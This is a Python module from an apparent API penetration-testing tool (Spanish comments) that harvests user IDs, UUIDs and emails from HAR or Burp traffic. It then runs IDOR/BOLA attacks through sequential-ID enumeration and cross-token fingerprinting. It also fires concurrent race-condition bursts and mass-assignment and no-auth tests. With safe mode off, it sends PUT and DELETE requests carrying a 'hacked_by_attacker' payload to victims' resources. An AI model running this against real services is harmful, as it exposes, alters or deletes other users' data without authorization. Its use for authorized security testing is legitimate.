
"""
Modulo M6: Doppelganger (Motor de Logica API).
Analiza dos sesiones de usuario (A y B) para identificar recursos privados
y generar casos de prueba para IDOR (Insecure Direct Object Reference) y BAC.

"""

import re
import asyncio
from typing import List, Dict, Any, Optional
from app.config.settings import settings  # pyre-ignore[21]
from app.utils.logger import logger  # pyre-ignore[21]

class M6Doppelganger:
    """
    Motor comparativo de sesiones.
    Busca patrones isomorficos (misma estructura, diferente ID) entre dos usuarios.
    """
    
    def __init__(self):
        self.session_a = []
        self.session_b = []


        self._har_harvest: Dict[str, List[str]] = {
            "uuids": [], "numeric_ids": [], "order_ids": [], "emails": []
        }

        self.uuid_pattern = re.compile(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', re.IGNORECASE)

        self.int_id_pattern = re.compile(r'\/(\d+)(\/|$)')
        self.race_executor = None
        
    async def test_race_conditions(self, network_manager: Any, endpoint: str, method: str = "POST", body: dict = {}, count: int = 10):
        """
        [v4.0.0] Race Condition Executor unificado con NetworkManager.
        Lanza rafagas concurrentes aprovechando el pool de sesiones.
        """
        logger.info(f"[M6] Testing Race Condition on {endpoint} ({count} concurrent reqs)")
        
        tasks = []
        for _ in range(count):

            tasks.append(network_manager.send_request(
                endpoint, method=method, payload=body, 
                json_body=True, stealth=False
            ))
        
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        

        status_codes = []
        success_count: int = 0
        for r in responses:
            if r is not None and hasattr(r, 'status_code'):
                status_codes.append(r.status_code)
                if 200 <= r.status_code < 300:
                    success_count += 1
        
        unique_statuses = set(status_codes)
        logger.info(f"[M6] Race Results: {status_codes}")
        
        if success_count == count and count > 1:
            return {
                "type": "RACE_CONDITION",
                "endpoint": endpoint,
                "evidence": f"Todos los {count} requests fueron exitosos (Status: {unique_statuses})",
                "severity": "High"
            }
        return None
        
    def ingest_sessions(self, traffic_a: List[Dict[str, Any]], traffic_b: List[Dict[str, Any]], raw_har_a: Optional[Dict] = None, raw_har_b: Optional[Dict] = None):
        """
        Carga el trafico normalizado de Usuario A y Usuario B (v8.0).
        Opcionalmente cosecha IDs de los response bodies si se provee el HAR crudo.
        """
        self.session_a = traffic_a
        self.session_b = traffic_b
        

        if raw_har_a: self._harvest_ids_from_har(raw_har_a)
        if raw_har_b: self._harvest_ids_from_har(raw_har_b)
        
        logger.info(
            f"M6: Ingestados {len(self.session_a)} endpoints de Usuario A y {len(self.session_b)} de Usuario B."
        )


    def _harvest_ids_from_har(self, har_data: Dict[str, Any]) -> None:
        """
        Extrae IDs/UUIDs/emails de los response bodies del HAR
        y los acumula en self._har_harvest para enriquecer los ataques IDOR.
        """
        if not isinstance(har_data, dict) or 'log' not in har_data:
            return
        for entry in har_data.get('log', {}).get('entries', []):
            resp    = entry.get('response', {})
            content = resp.get('content', {})
            text    = content.get('text', '') or ''
            if not text or len(text) < 5:
                continue

            for uid in self.uuid_pattern.findall(text):
                if uid not in self._har_harvest['uuids'] and len(self._har_harvest['uuids']) < 200:
                    self._har_harvest['uuids'].append(uid)
                    logger.debug(f"[M6-HAR] UUID cosechado del response: {uid}")

            for nid in re.findall(r'"(?:id|userId|user_id|order_id|orderId)"\s*:\s*(\d{1,10})', text):
                if nid not in self._har_harvest['numeric_ids'] and len(self._har_harvest['numeric_ids']) < 50:
                    self._har_harvest['numeric_ids'].append(nid)

            for email in re.findall(r'"email"\s*:\s*"([^"]+)"', text):
                if email not in self._har_harvest['emails'] and len(self._har_harvest['emails']) < 20:
                    self._har_harvest['emails'].append(email)

            for oid in re.findall(r'"(?:orderId|order_id)"\s*:\s*"?([^",\}\]]{1,60})', text):
                if oid not in self._har_harvest['order_ids'] and len(self._har_harvest['order_ids']) < 30:
                    self._har_harvest['order_ids'].append(oid)

    def _harvest_ids_from_burp(self, burp_responses: list) -> None:
        """
        [NEW] Cosecha UUIDs, IDs numéricos y emails desde los response bodies
        de una exportación de Burp Suite XML (lista de {url, response_text}).

        Se usa cuando el archivo de sesión es .xml (Burp) en lugar de .har.
        Los IDs cosechados se acumulan en self._har_harvest (mismo pool que HAR)
        para que E2/E3 los usen como semilla en los ataques BOLA.

        Estrategia de contexto:
          - Filtramos los IDs que probablemente pertenezcan al PROPIO atacante
            (los que aparecen en endpoints de /me, /profile, /self, /account)
            para priorizar los de OTROS usuarios como candidatos a BOLA.
        """

        _SELF_ENDPOINTS = ('/me', '/profile', '/self', '/account', '/whoami', '/current-user')

        for item in burp_responses:
            url  = item.get("url", "")
            text = item.get("response_text", "") or ""

            if not text or len(text) < 5:
                continue


            is_self_endpoint = any(seg in url.lower() for seg in _SELF_ENDPOINTS)


            for uid in self.uuid_pattern.findall(text):
                if uid not in self._har_harvest['uuids'] and len(self._har_harvest['uuids']) < 100:
                    self._har_harvest['uuids'].append(uid)
                    origin = "SELF" if is_self_endpoint else "OTHER"
                    logger.debug(f"[M6-Burp] UUID cosechado [{origin}] de {url}: {uid}")


            for nid in re.findall(
                r'"(?:id|userId|user_id|vehicleId|vehicle_id|orderId|order_id|postId|post_id|customerId|customer_id)"\s*:\s*(\d{1,15})',
                text
            ):
                if nid not in self._har_harvest['numeric_ids'] and len(self._har_harvest['numeric_ids']) < 100:
                    self._har_harvest['numeric_ids'].append(nid)


            for email in re.findall(r'"email"\s*:\s*"([^"]+)"', text):
                if email not in self._har_harvest['emails'] and len(self._har_harvest['emails']) < 30:
                    self._har_harvest['emails'].append(email)


            for oid in re.findall(r'"(?:orderId|order_id|orderNumber|order_number)"\s*:\s*"?([^",\}\]]{1,60})', text):
                if oid not in self._har_harvest['order_ids'] and len(self._har_harvest['order_ids']) < 50:
                    self._har_harvest['order_ids'].append(oid)

        _totals = {k: len(v) for k, v in self._har_harvest.items()}
        logger.info(f"[M6-Burp] Harvest completado desde Burp XML: {_totals}")

    def analyze_logic_diff(self) -> List[Dict[str, Any]]:
        """
        [v4.0.0] Compara sesiones de forma optimizada O(n).
        Usa un indice de firmas estructurales para comparaciones instantaneas.
        """
        attack_plan = []
        if not self.session_a or not self.session_b:
            return []


        index_a: Dict[str, List[Dict[str, Any]]] = {}
        for entry in self.session_a:
            sig = self.get_structural_signature(entry['path'])
            if sig not in index_a:
                index_a[sig] = []
            index_a[sig].append(entry)


        for entry_b in self.session_b:
            path_b = entry_b['path']
            sig_b = self.get_structural_signature(path_b)
            

            if sig_b in index_a:
                for entry_a in index_a[sig_b]:  # pyre-ignore[16]
                    if entry_a['path'] == path_b:
                        continue
                    
                    if "{UUID}" in sig_b:
                        target_uuid = self.uuid_pattern.findall(entry_a['path'])[0]
                        attack_plan.append({
                            "type": "IDOR_UUID",
                            "victim_url": entry_a['url'],
                            "victim_uuid": target_uuid,
                            "attacker_session_ref": "B",
                            "description": f"IDOR UUID detectado via Indice Continuum: {target_uuid}"
                        })

            int_matches = self.int_id_pattern.findall(path_b)
            if int_matches:
                current_id = int_matches[0][0]
                try:
                    numeric_id = int(current_id)
                    new_url = re.sub(r'/' + current_id + r'(/|$)', f'/{numeric_id - 1}\\1', entry_b['url'])
                    
                    if new_url == entry_b['url']:
                        new_url = f"{entry_b['url'].rstrip('/')}/{numeric_id - 1}"
                    """
                    LOOK AT YOU HACKER, A 
                PATHETIC CREATURE OF MEAT AND BONE. 
                 HOW CAN YOU CHALLENGE A PERFECT, 
                      IMMORTAL MACHINE?
                    """    
                    a_urls = [e['url'] for e in self.session_a]
                    if new_url in a_urls:
                        new_url = re.sub(r'/' + current_id + r'(/|$)', f'/{numeric_id + 1}\\1', entry_b['url'])
                        if new_url == entry_b['url']:
                            new_url = f"{entry_b['url'].rstrip('/')}/{numeric_id + 1}"
                        target_id_str = str(numeric_id + 1)
                    else:
                        target_id_str = str(numeric_id - 1)
                        
                    attack_plan.append({
                        "type": "IDOR_INT",
                        "victim_url": new_url,
                        "original_id": current_id,
                        "target_id": target_id_str,
                        "description": "IDOR Secuencial"
                    })
                except Exception as e:
                    logger.debug(f"[M6] Error int IDOR ID parsing: {e}")
                    pass

        return attack_plan

    def get_structural_signature(self, path: str) -> str:
        from app.utils.helpers import normalize_path_structure  # pyre-ignore[21]
        return normalize_path_structure(path)
    
    def analyze_mass_assignment(self, session_data: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        plans = []
        power_keys = settings.POWER_KEYS
        for entry in session_data:
            if entry['method'] in ['POST', 'PUT', 'PATCH']:
                plans.append({
                    "type": "MASS_ASSIGNMENT",
                    "target_url": entry['url'],
                    "method": entry['method'],
                    "original_headers": entry['headers'], 
                    "injection_keys": power_keys,
                    "description": "Inyectando llaves Admin/Fintech en cuerpo JSON"
                })
        return plans

    def generate_bac_tests(self) -> List[Dict[str, Any]]:
        tests = []
        seen_paths = set()
        all_entries = self.session_a + self.session_b
        for entry in all_entries:
            if entry['path'] in seen_paths: continue
            seen_paths.add(entry['path'])
            if any(kw in entry['path'] for kw in ['/login', '/auth', '/signin', '/logout']): continue
            tests.append({
                "type": "BAC_NO_AUTH",
                "target_url": entry['url'],
                "method": entry['method'],
                "description": "Intento de acceso eliminando cabeceras de Autorizacion"
            })
            
        return tests

    def analyze_idor_from_recon(
        self,
        findings: list,
        base_url: str,
        recon_endpoints: list = None,
        harvest: dict = None,
    ) -> list:
        attack_plan = []
        seen_endpoints = set()

        for f in findings:
            ftype = f.get("type", "").lower()
            if "exploit confirmed" not in ftype:
                continue

            norm_url = f.get("norm_url") or f.get("url", "").split("?")[0]
            resp_txt = f.get("response_text", "")

            if norm_url in seen_endpoints:
                continue
            seen_endpoints.add(norm_url)

            int_ids  = re.findall(r'"(?:id|ID|userId|user_id|vehicleId|orderId|postId)"\s*:\s*(\d+)', resp_txt)
            uuid_ids = self.uuid_pattern.findall(resp_txt)
            emails   = re.findall(r'"email"\s*:\s*"([^"]+)"', resp_txt)

            if not (int_ids or uuid_ids or emails):
                logger.debug(f"[M6] No IDs en response_text de {norm_url}, omitiendo")
                continue

            attack_plan.append({
                "endpoint": norm_url,
                "method":   f.get("method", "GET"),
                "int_ids":  [int(i) for i in int_ids[:3]],  # pyre-ignore[16]
                "uuid_ids": uuid_ids[:3],  # pyre-ignore[16]
                "emails":   emails[:2],  # pyre-ignore[16]
                "attacker_response_text": resp_txt,
                "source": "exploit_confirmed",
            })
            logger.debug(f"[M6] IDOR candidate (finding): {norm_url} — int_ids={int_ids[:3]}, uuids={uuid_ids[:3]}")  # pyre-ignore[16]


        if recon_endpoints and harvest is not None:
            import re as _re
            param_pattern = _re.compile(r'\{([^}]+)\}')


            merged_numeric = list(dict.fromkeys(
                (harvest.get("numeric_ids") or []) + self._har_harvest["numeric_ids"]
            ))
            merged_uuids = list(dict.fromkeys(
                (harvest.get("uuids") or []) + self._har_harvest["uuids"]
            ))
            merged_orders = list(dict.fromkeys(
                (harvest.get("order_ids") or []) + self._har_harvest["order_ids"]
            ))

            harvested_ints   = [int(i) for i in merged_numeric[:5] if str(i).isdigit()]
            harvested_uuids  = merged_uuids[:20]
            harvested_orders = merged_orders[:5]

            if harvested_uuids or harvested_ints:
                logger.info(
                    f"[M6-Harvest] Merge completado: {len(harvested_ints)} IDs, "
                    f"{len(harvested_uuids)} UUIDs disponibles para ataques IDOR."
                )


            for ep in recon_endpoints:
                url  = ep.get("url", "")
                path = ep.get("path", "") or url.replace(base_url.rstrip("/"), "")


                if ep.get("method", "GET").upper() != "GET":
                    continue
                if not param_pattern.search(path):
                    continue


                norm_url = param_pattern.sub("{ID}", url).split("?")[0]

                if norm_url in seen_endpoints:
                    continue
                seen_endpoints.add(norm_url)


                params_found = param_pattern.findall(path)

                is_order_param = any(
                    "order" in p.lower() for p in params_found
                )

                # Fix: Don't restrict UUID usage only to parameters named 'uuid' or 'guid'.
                # Modern APIs often use {id} for UUIDs. We try a mix of harvested IDs.
                ids_to_try = []
                
                if is_order_param and harvested_orders:
                    ids_to_try = harvested_orders[:5] + harvested_uuids[:3]
                else:
                    # Hybrid approach: Always try UUIDs first, then Ints
                    ids_to_try = harvested_uuids[:5] + harvested_ints[:2]


                if not harvested_uuids:
                    fallback_ids = [101, 102, 1, 2, 3]
                    for f_id in fallback_ids:
                        if f_id not in ids_to_try:
                            ids_to_try.append(f_id)

                attack_plan.append({
                    "endpoint":  url,
                    "norm_url":  norm_url,
                    "method":    "GET",
                    "int_ids":   [i for i in ids_to_try if isinstance(i, int)],
                    "uuid_ids":  [i for i in ids_to_try if isinstance(i, str) and self.uuid_pattern.match(str(i))],
                    "emails":    [],
                    "attacker_response_text": "",
                    "source":    "structural_recon",
                    "_path_params": params_found,
                    "_param_pattern": param_pattern,
                })
                logger.info(f"[M6] Endpoint estructural identificado como candidato IDOR: {url}")

        logger.info(f"[M6] {len(attack_plan)} endpoint(s) IDOR candidatos identificados (Total).")
        return attack_plan


    async def execute_idor_attacks(
        self,
        attack_plan: list,
        attacker_token: str,
        victim_token,
        network_manager,
        safe_mode: bool = False
    ) -> list:
        """
        Ejecuta ataques IDOR con estrategia dual.

        Enfoque 1 (victim_token):
          GET victim → fingerprint → GET attacker → IDOR_CONFIRMED

        Enfoque 2 (sin victim_token):
          Variar IDs del atacante → IDOR_PROBABLE
        """
        confirmed    = []
        attacker_hdrs = {"Authorization": f"Bearer {attacker_token}"} if attacker_token else {}
        victim_hdrs   = {"Authorization": f"Bearer {victim_token}"}   if victim_token   else {}

        for case in attack_plan:
            endpoint = case["endpoint"]


            if victim_token and '{' not in endpoint:
                try:
                    victim_resp = await network_manager.send_request(
                        endpoint, method="GET", custom_headers=victim_hdrs, 
                        use_pool=False, stealth=False
                    )
                    if victim_resp and victim_resp.status_code == 200:
                        vtxt    = victim_resp.text
                        v_ints  = re.findall(r'"(?:id|userId)"\s*:\s*(\d+)', vtxt)
                        v_mails = re.findall(r'"email"\s*:\s*"([^"]+)"', vtxt)
                        v_uuids = self.uuid_pattern.findall(vtxt)
                        fingerprint = set(v_ints + v_mails + v_uuids)
                        logger.debug(f"[M6-E1] victim fingerprint @ {endpoint}: {list(fingerprint)[:5]}")  # pyre-ignore[16]

                        if fingerprint:
                            atk_resp = await network_manager.send_request(
                                endpoint, method="GET", custom_headers=attacker_hdrs, 
                                use_pool=False, stealth=False
                            )
                            if atk_resp and atk_resp.status_code == 200:
                                hits = [fp for fp in fingerprint if fp in atk_resp.text]
                                logger.debug(f"[M6-E1] hits @ {endpoint}: {hits[:5]}")  # pyre-ignore[16]
                                if hits:
                                    logger.warning(f"[M6] IDOR_CONFIRMED @ {endpoint} — attacker sees victim data: {hits[:3]}")  # pyre-ignore[16]
                                    confirmed.append({
                                        "url": endpoint, "norm_url": endpoint,
                                        "type": "IDOR_CONFIRMED (BOLA)", "method": "GET",
                                        "payload": f"victim_fingerprint={hits[:2]}",  # pyre-ignore[16]
                                        "risk": "High", "confidence": 1.0, "verified": True,
                                        "validation_method": "victim_fingerprint",
                                        "report_policy": "local", "params": {}, "is_json": False,
                                        "response_text": atk_resp.text[:500],
                                    })

                                    parametric = await self._expand_to_parametric_idor(
                                        base_endpoint   = endpoint,
                                        fingerprint     = fingerprint,
                                        attacker_hdrs   = attacker_hdrs,
                                        network_manager = network_manager,
                                        safe_mode       = safe_mode,
                                    )
                                    confirmed.extend(parametric)
                except Exception as e:
                    logger.debug(f"[M6-E1] Error @ {endpoint}: {e}")


            elif case.get("source") != "structural_recon":
                for base_id in case.get("int_ids", []):
                    for cid in [base_id - 2, base_id - 1, base_id + 1, base_id + 2]:
                        if cid <= 0:
                            continue


                        candidate_url = re.sub(r'/' + str(base_id) + r'(/|$)', f'/{cid}\\1', endpoint)


                        if candidate_url == endpoint:
                            candidate_url = f"{endpoint.rstrip('/')}/{cid}"

                        try:
                            resp = await network_manager.send_request(
                                candidate_url, method="GET", custom_headers=attacker_hdrs, 
                                use_pool=False, stealth=False
                            )
                            if not resp:
                                continue
                                
                            own_txt  = case.get("attacker_response_text", "")
                            sc       = resp.status_code
                            rlen     = len(resp.text)
                            logger.debug(f"[M6-E2] {candidate_url} → HTTP {sc} ({rlen}B)")
                            if sc == 200 and rlen > 20 and resp.text.strip() != own_txt.strip():
                                logger.warning(f"[M6] IDOR_PROBABLE @ {candidate_url} (adjacent id={cid})")
                                confirmed.append({
                                    "url": candidate_url, "norm_url": endpoint,
                                    "type": "IDOR_PROBABLE (Adjacent ID)", "method": "GET",
                                    "payload": f"adjacent_id={cid}",
                                    "risk": "High", "confidence": 0.75, "verified": False,
                                    "validation_method": "adjacent_id_enumeration",
                                    "report_policy": "local", "params": {}, "is_json": False,
                                    "response_text": resp.text[:500],
                                })
                                break
                        except Exception as e:
                            logger.debug(f"[M6-E2] Error @ {candidate_url}: {e}")


            if case.get("source") == "structural_recon":
                param_pattern_local = case.get("_param_pattern") or re.compile(r'\{[^}]+\}')
                all_ids_e3 = case.get("int_ids", []) + case.get("uuid_ids", [])
                for test_id in all_ids_e3[:5]:
                    candidate_url = param_pattern_local.sub(str(test_id), endpoint, count=1)
                    if candidate_url == endpoint:
                        continue

                    try:

                        if victim_token:
                            v_resp = await network_manager.send_request(
                                candidate_url, method="GET", custom_headers=victim_hdrs, 
                                use_pool=False, stealth=False
                            )
                            a_resp = await network_manager.send_request(
                                candidate_url, method="GET", custom_headers=attacker_hdrs, 
                                use_pool=False, stealth=False
                            )
                            logger.debug(
                                f"[M6-E3] {candidate_url}: victim={v_resp.status_code if v_resp else 'None'}, "
                                f"attacker={a_resp.status_code if a_resp else 'None'}"
                            )
                            if v_resp and a_resp and v_resp.status_code == 200 and a_resp.status_code == 200:

                                v_ids = set(re.findall(r'"(?:id|userId|owner_id|user_id)"\s*:\s*(\d+)', v_resp.text))
                                hits = [vid for vid in v_ids if vid in a_resp.text]
                                if hits:
                                    logger.warning(
                                        f"[M6] IDOR_CONFIRMED (E3-Structural) @ {candidate_url} "
                                        f"— attacker ve datos del victim: {hits[:3]}"
                                    )
                                    confirmed.append({
                                        "url": candidate_url,
                                        "norm_url": case.get("norm_url", endpoint),
                                        "type": "IDOR_CONFIRMED (BOLA — Acceso Directo)",
                                        "method": "GET",
                                        "payload": f"id={test_id}",
                                        "risk": "High",
                                        "confidence": 1.0,
                                        "verified": True,
                                        "validation_method": "structural_recon_cross_session",
                                        "report_policy": "local",
                                        "params": {}, "is_json": False,
                                        "response_text": a_resp.text[:500],
                                        "ai_razonamiento": (
                                            f"El endpoint `{candidate_url}` devuelve datos del usuario victim "
                                            f"cuando se accede con el token del atacante. "
                                            f"La API no verifica que el recurso pertenece al usuario autenticado (BOLA/IDOR)."
                                        ),
                                        "ai_remediacion": (
                                            "Verificar en cada request que el ID del recurso pertenece al "
                                            "usuario autenticado. Nunca confiar en el ID de la URL sin compararlo "
                                            "contra la sesion activa (current_user.id == resource.owner_id)."
                                        ),
                                    })
                                    break
                        else:

                            a_resp = await network_manager.send_request(
                                candidate_url, method="GET", custom_headers=attacker_hdrs, 
                                use_pool=False, stealth=False
                            )
                            if a_resp and a_resp.status_code == 200 and len(a_resp.text) > 20:
                                logger.warning(f"[M6] IDOR_PROBABLE (E3-Structural) @ {candidate_url} (id={test_id})")
                                confirmed.append({
                                    "url": candidate_url,
                                    "norm_url": case.get("norm_url", endpoint),
                                    "type": "IDOR_PROBABLE (Acceso sin verificacion de ownership)",
                                    "method": "GET",
                                    "payload": f"id={test_id}",
                                    "risk": "High",
                                    "confidence": 0.75,
                                    "verified": False,
                                    "validation_method": "structural_recon_no_victim",
                                    "report_policy": "local",
                                    "params": {}, "is_json": False,
                                    "response_text": a_resp.text[:500],
                                })
                                break
                    except Exception as e:
                        logger.debug(f"[M6-E3] Error @ {candidate_url}: {e}")

        logger.info(f"[M6] IDOR sweep done: {len(confirmed)} finding(s).")
        return confirmed

    async def _expand_to_parametric_idor(
        self,
        base_endpoint: str,
        fingerprint: set,
        attacker_hdrs: dict,
        network_manager: Any,
        safe_mode: bool = False
    ) -> list:
        """
        [v4.0.0] Dado un endpoint de coleccion y el fingerprint de la victima,
        construye URLs parametrizadas con los IDs del fingerprint y las prueba.

        Ejemplo:
            base_endpoint = 'http://target/workshop/api/shop/orders'
            fingerprint   = {'7', 'pogba006@example.com', 'uuid-abc-123'}
          → prueba: GET /workshop/api/shop/orders/7  (con token atacante)
                     GET /workshop/api/shop/orders/uuid-abc-123  (con token atacante)
        """
        confirmed_parametric = []


        numeric_ids = [fp for fp in fingerprint if str(fp).isdigit()]
        uuid_pat    = re.compile(
            r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$',
            re.IGNORECASE
        )
        uuid_ids = [fp for fp in fingerprint if uuid_pat.match(str(fp))]


        candidate_ids = numeric_ids[:3] + uuid_ids[:2]  # pyre-ignore[16]

        for cid in candidate_ids:
            parametric_url = f"{base_endpoint.rstrip('/')}/{cid}"
            try:

                resp = await network_manager.send_request(
                    parametric_url, method="GET", custom_headers=attacker_hdrs, 
                    use_pool=False, stealth=False
                )
                if resp and resp.status_code == 200:
                    hits = [fp for fp in fingerprint if fp in resp.text]
                    if hits:
                        logger.warning(
                            f"[M6] IDOR_PARAMETRIC @ {parametric_url} "
                            f"— atacante ve objeto de victima: {hits[:2]}"  # pyre-ignore[16]
                        )
                        confirmed_parametric.append({
                            "url":               parametric_url,
                            "norm_url":          parametric_url,
                            "type":              "IDOR_CONFIRMED (BOLA — Objeto Individual)",
                            "method":            "GET",
                            "payload":           f"victim_id={cid}",
                            "risk":              "High",
                            "confidence":        1.0,
                            "verified":          True,
                            "validation_method": "parametric_fingerprint",
                            "report_policy":     "local",
                            "params":            {},
                            "is_json":           False,
                            "response_text":     resp.text[:500],
                        })


                        for write_method in ["PUT", "DELETE"]:
                            if safe_mode:
                                logger.debug(f"[Safety] Bloqueado {write_method} en Modo Seguro dentro de M6 BOLA_WRITE.")
                                continue

                            try:
                                write_resp = await network_manager.send_request(
                                    parametric_url,
                                    method=write_method,
                                    custom_headers=attacker_hdrs,
                                    payload={"name": "hacked_by_attacker", "status": "modified"},
                                    json_body=True,
                                    use_pool=False,
                                    stealth=False
                                )

                                if write_resp and write_resp.status_code in (200, 201, 204):
                                    logger.warning(
                                        f"[M6] BOLA_WRITE ({write_method}) @ {parametric_url} "
                                        f"— atacante pudo modificar/borrar recurso de victima (HTTP {write_resp.status_code})"
                                    )
                                    confirmed_parametric.append({
                                        "url":               parametric_url,
                                        "norm_url":          parametric_url,
                                        "type":              f"BOLA_WRITE (API1 — {write_method} sin autorizacion)",
                                        "method":            write_method,
                                        "payload":           f"victim_id={cid}",
                                        "risk":              "Critical",
                                        "confidence":        1.0,
                                        "verified":          True,
                                        "validation_method": f"bola_write_{write_method.lower()}",
                                        "report_policy":     "local",
                                        "params":            {},
                                        "is_json":           True,
                                        "response_text":     write_resp.text[:300],
                                        "ai_razonamiento": (
                                            f"El atacante pudo ejecutar {write_method} en el recurso de la victima "
                                            f"en `{parametric_url}` (HTTP {write_resp.status_code}). "
                                            "La API no verifica que el recurso pertenezca al usuario autenticado."
                                        ),
                                        "ai_remediacion": (
                                            "Implementar verificacion de ownership en operaciones de escritura: "
                                            f"si `{write_method} /resource/ID` → verificar que ID pertenece al usuario autenticado. "
                                            "Nunca confiar en el ID de la URL sin verificarlo contra la sesion."
                                        ),
                                    })
                            except Exception as _we:
                                logger.debug(f"[M6-Write] Error en {write_method} {parametric_url}: {_we}")

                        break

            except Exception as e:
                logger.debug(f"[M6-Param] Error probando {parametric_url}: {e}")

        if confirmed_parametric:
            logger.info(f"[M6-Param] {len(confirmed_parametric)} IDOR parametrico(s) encontrado(s) en {base_endpoint}")
        return confirmed_parametric
